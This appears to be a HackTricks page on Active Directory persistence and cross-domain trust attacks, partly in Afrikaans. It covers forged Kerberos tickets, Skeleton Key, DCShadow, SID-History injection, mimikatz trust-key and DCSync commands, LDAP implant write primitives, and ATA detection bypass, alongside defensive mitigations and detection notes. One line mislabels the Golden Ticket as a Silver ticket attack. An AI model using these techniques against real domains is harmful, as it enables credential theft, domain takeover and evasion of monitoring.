The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is a very good way to be able to persist in the users account (even if he changes the password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

The **AdminSDHolder** object in Active Directory ensures the security of **privileged groups** (like Domain Admins and Enterprise Admins) by applying a standard **Access Control List (ACL)** across these groups to prevent unauthorized changes. However, this feature can be exploited; if an attacker modifies the AdminSDHolder's ACL to give full access to a regular user, that user gains extensive control over all privileged groups. This security measure, meant to protect, can thus backfire, allowing unwarranted access unless closely monitored.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Inside every **Domain Controller (DC)**, a **local administrator** account exists. By obtaining admin rights on such a machine, the local Administrator hash can be extracted using **mimikatz**. Following this, a registry modification is necessary to **enable the use of this password**, allowing for remote access to the local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Previously we have discussed about how to escalate privileges if you have **enough permission to read LAPS passwords**. However, these passwords can also be used to **maintain persistence**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft views the **Forest** as the security boundary. This implies that **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is a security mechanism that enables a user from one **domain** to access resources in another **domain**. It essentially creates a linkage between the authentication systems of the two domains, allowing authentication verifications to flow seamlessly. When domains set up a trust, they exchange and retain specific **keys** within their **Domain Controllers (DCs)**, which are crucial to the trust's integrity.

In a typical scenario, if a user intends to access a service in a **trusted domain**, they must first request a special ticket known as an **inter-realm TGT** from their own domain's DC. This TGT is encrypted with a shared **key** that both domains have agreed upon. The user then presents this TGT to the **DC of the trusted domain** to get a service ticket (**TGS**). Upon successful validation of the inter-realm TGT by the trusted domain's DC, it issues a TGS, granting the user access to the service.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in **Domain A**, this would be an **Outbound trust**; and in **Domain B**, this would be an **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: This is a common setup within the same forest, where a child domain automatically has a two-way transitive trust with its parent domain. Essentially, this means that authentication requests can flow seamlessly between the parent and the child.
- **Cross-link Trusts**: Referred to as "shortcut trusts," these are established between child domains to expedite referral processes. In complex forests, authentication referrals typically have to travel up to the forest root and then down to the target domain. By creating cross-links, the journey is shortened, which is especially beneficial in geographically dispersed environments.
- **External Trusts**: These are set up between different, unrelated domains and are non-transitive by nature. According to [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts are useful for accessing resources in a domain outside of the current forest that isn't connected by a forest trust. Security is bolstered through SID filtering with external trusts.
- **Tree-root Trusts**: These trusts are automatically established between the forest root domain and a newly added tree root. While not commonly encountered, tree-root trusts are important for adding new domain trees to a forest, enabling them to maintain a unique domain name and ensuring two-way transitivity. More information can be found in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: This type of trust is a two-way transitive trust between two forest root domains, also enforcing SID filtering to enhance security measures.
- **MIT Trusts**: These trusts are established with non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts are a bit more specialized and cater to environments requiring integration with Kerberos-based systems outside the Windows ecosystem.

#### Other differences in **trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domain trusts te enumereer:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 trusted keys**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domain gebruik word vind met:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin na die child/parent domain deur die trust te abuse met SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Om te verstaan hoe die Configuration Naming Context (NC) uitgebuit kan word, is deurslaggewend. Die Configuration NC dien as 'n sentrale repository vir configuration data oor 'n forest in Active Directory (AD) environments. Hierdie data word na elke Domain Controller (DC) binne die forest gereplikeer, met writable DCs wat 'n writable copy van die Configuration NC onderhou. Om dit uit te buit, moet 'n mens **SYSTEM privileges op 'n DC** hê, verkieslik 'n child DC.

**Link GPO to root DC site**

Die Configuration NC se Sites container bevat inligting oor al die domain-joined computers se sites binne die AD forest. Deur met SYSTEM privileges op enige DC te werk, kan attackers GPOs aan die root DC sites koppel. Hierdie aksie kan moontlik die root domain kompromitteer deur policies te manipuleer wat op hierdie sites toegepas word.

Vir in-diepte inligting kan 'n mens research oor [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) verken.

**Compromise any gMSA in the forest**

'n Attack vector behels die teiken van privileged gMSAs binne die domain. Die KDS Root key, noodsaaklik vir die berekening van gMSAs se passwords, word binne die Configuration NC gestoor. Met SYSTEM privileges op enige DC is dit moontlik om toegang tot die KDS Root key te kry en die passwords vir enige gMSA regoor die forest te bereken.

Gedetailleerde analise en stap-vir-stap leiding kan gevind word in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Bykomende eksterne research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Hierdie metode vereis geduld, en wag vir die skepping van nuwe privileged AD objects. Met SYSTEM privileges kan 'n attacker die AD Schema wysig om enige user volledige beheer oor alle classes te gee. Dit kan lei tot unauthorized access en beheer oor nuutgeskepte AD objects.

Verder lees is beskikbaar oor [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5 vulnerability teiken beheer oor Public Key Infrastructure (PKI) objects om 'n certificate template te skep wat authentication as enige user binne die forest moontlik maak. Aangesien PKI objects in die Configuration NC woon, stel die kompromittering van 'n writable child DC die uitvoering van ESC5 attacks moontlik.

Meer besonderhede hieroor kan gelees word in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios sonder ADCS het die attacker die vermoë om die nodige components op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario **jou domein is trusted** deur ’n eksterne een, wat jou **ongedefinieerde toestemmings** daaroor gee. Jy sal moet uitvind **watter principals van jou domein watter toegang oor die eksterne domein het** en dan probeer om dit uit te buit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest Domain - Eenrigting (Uitgaand)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario **jou domain** **vertrou** sekere **privileges** aan principal van **verskillende domains**.

Wanneer ’n **domain trusted** word deur die trusting domain, skep die trusted domain egter **’n user** met ’n **voorspelbare naam** wat die **trusted password** as **password** gebruik. Dit beteken dat dit moontlik is om **toegang te kry tot ’n user van die trusting domain** om in die trusted domain in te kom, dit te enumereer en te probeer om meer privileges te eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog ’n manier om die trusted domain te kompromitteer, is om ’n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domain trust geskep is (wat nie baie algemeen is nie).

Nog ’n manier om die trusted domain te kompromitteer, is om te wag in ’n machine waar ’n **user van die trusted domain toegang kan kry** om via **RDP** aan te meld. Dan kan die attacker code in die RDP session process inspuit en van daar af toegang kry tot die origin domain van die victim.\
Verder, as die **victim sy hard drive gemount het**, kan die attacker vanaf die **RDP session** process **backdoors** in die **startup folder van die hard drive** stoor. Hierdie technique word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Die risk van attacks wat die SID history attribute oor forest trusts heen gebruik, word gemitigeer deur SID Filtering, wat by verstek op alle inter-forest trusts geaktiveer is. Dit rus op die aanname dat intra-forest trusts veilig is, en beskou die forest, eerder as die domain, as die security boundary volgens Microsoft se standpunt.
- Daar is egter ’n vangplek: SID filtering kan applications en user access ontwrig, wat lei tot die af en toe deaktivering daarvan.

### **Selective Authentication:**

- Vir inter-forest trusts verseker Selective Authentication dat users van die twee forests nie outomaties authenticated word nie. In plaas daarvan is eksplisiete permissions nodig vir users om domains en servers binne die trusting domain of forest te access.
- Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerm teen die uitbuiting van die writable Configuration Naming Context (NC) of attacks op die trust account nie.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementeer weer bloodyAD-styl LDAP primitives as x64 Beacon Object Files wat heeltemal binne ’n on-host implant loop (bv. Adaptix C2). Operators compileer die pack met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon. Alle traffic gebruik die huidige logon security context oor LDAP (389) met signing/sealing of LDAPS (636) met outomatiese certificate trust, so geen socks proxies of disk artifacts is nodig nie.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, en `get-groupmembers` los kort names/OU paths op na volledige DNs en dump die ooreenstemmende objects.
- `get-object`, `get-attribute`, en `get-domaininfo` haal arbitrêre attributes (insluitend security descriptors) plus die forest/domain metadata van `rootDSE` af.
- `get-uac`, `get-spn`, `get-delegation`, en `get-rbcd` stel roasting candidates, delegation settings, en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors direk vanaf LDAP bloot.
- `get-acl` en `get-writable --detailed` parseer die DACL om trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), en inheritance te lys, wat onmiddellike targets vir ACL privilege escalation gee.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP skryf-primitiewe vir eskalasie & volharding

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operateur toe om nuwe principals of machine accounts te stage waar ook al OU rights bestaan. `add-groupmember`, `set-password`, `add-attribute`, en `set-attribute` hijack teikens direk sodra write-property rights gevind is.
- ACL-gefokusde commands soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, en `add-dcsync` vertaal WriteDACL/WriteOwner op enige AD object in password resets, group membership control, of DCSync replication privileges sonder om PowerShell/ADSI artifacts agter te laat. `remove-*` eweknieë maak injected ACEs skoon.

### Delegation, roasting, en Kerberos misuse

- `add-spn`/`set-spn` maak onmiddellik `n compromised user Kerberoastable; `add-asreproastable` (UAC toggle) merk dit vir AS-REP roasting sonder om die password aan te raak.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC flags, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD attack paths moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory injection, OU-relokasie, en aanval-oppervlak vorming

- `add-sidhistory` spuit privileged SIDs in `n controlled principal se SID history in (sien [SID-History Injection](sid-history-injection.md)), wat stealthy access inheritance volledig oor LDAP/LDAPS verskaf.
- `move-object` verander die DN/OU van computers of users, wat `n attacker toelaat om assets in OUs in te sleep waar delegated rights reeds bestaan voordat `set-password`, `add-groupmember`, of `add-spn` misbruik word.
- Styf-geskepte removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) laat vinnige rollback toe nadat die operateur credentials of persistence geoes het, en minimaliseer telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Dit word aanbeveel dat Domain Admins slegs toegelaat moet word om op Domain Controllers in te log, en hul gebruik op ander hosts te vermy.
- **Service Account Privileges**: Services moenie met Domain Admin (DA) privileges uitgevoer word nie om sekuriteit te handhaaf.
- **Temporal Privilege Limitation**: Vir take wat DA privileges vereis, moet die duur daarvan beperk word. Dit kan bereik word deur: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Ouditeer Event IDs 2889/3074/3075 en dwing dan LDAP signing plus LDAPS channel binding op DCs/clients af om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

As jy algemene AD tradecraft wil opspoor, **moenie net staatmaak op operator-controlled artifacts** soos hernoemde binaries, service names, temp batch files, of output paths nie. Stel vas hoe legitieme Windows clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, en WMI traffic bou, en soek dan na **implementation quirks** wat oorbly selfs nadat die operateur `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, of `ntlmrelayx.py` wysig.

- **High-confidence standalone candidates** (na validasie teen jou eie baseline):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding gevul met `0xff`
- LDAP Kerberos binds wat `n raw Kerberos `AP-REQ` direk in SPNEGO `mechToken` plaas
- SMB2/3 negotiate requests met ASCII-agtige `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` wat die non-standard namespace `//./root/cimv2` gebruik
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse of duplicated Kerberos etype lists, unusual/missing `PA-DATA`, of TGS-REQ etype ordering wat van native Windows verskil
- NTLM Type 1 messages sonder version info of Type 3 messages met null host names
- Raw NTLMSSP wat in DCE/RPC gedra word in plaas van SPNEGO, ontbrekende DCE/RPC verification trailers, of SPNEGO/Kerberos OID mismatches
- Verskeie van hierdie eienskappe vanaf dieselfde host/user/session/time window is baie sterker as enige enkele swak field
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, en tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Hierdie is maklik vir operators om te verander en word die beste gebruik om te verduidelik hoekom `n cross-protocol cluster verdag is
- **Operational notes**:
- Sommige van hierdie signals vereis decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, of service-side visibility
- Valideer teen Samba/Linux clients, appliances, en legacy software voordat jy dit na alerts bevorder
- Bevorder detections van enrichment -> hunting -> alerting soos jy vertroue in die baseline bou

### **Implementing Deception Techniques**

- Implementing deception behels die opstel van traps, soos decoy users of computers, met features soos passwords wat nie verval nie of gemerk is as Trusted for Delegation. `n Gedetailleerde benadering sluit in die skep van users met spesifieke rights of om hulle by high privilege groups te voeg.
- `n Praktiese voorbeeld behels die gebruik van tools soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooiing van deception techniques kan gevind word by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Verdagte indicators sluit in atipiese ObjectSID, ongereelde logons, creation dates, en lae bad password counts.
- **General Indicators**: Deur attributes van moontlike decoy objects met dié van egte een te vergelyk, kan inconsistenties uitwys. Tools soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke deception te identifiseer.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermy session enumeration op Domain Controllers om ATA detection te voorkom.
- **Ticket Impersonation**: Die gebruik van **aes** keys vir ticket creation help om detection te ontduik deur nie af te skuif na NTLM nie.
- **DCSync Attacks**: Dit word aanbeveel om vanaf `n non-Domain Controller uit te voer om ATA detection te vermy, aangesien direkte uitvoering vanaf `n Domain Controller alerts sal aktiveer.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)

{{#include ../../banners/hacktricks-training.md}}
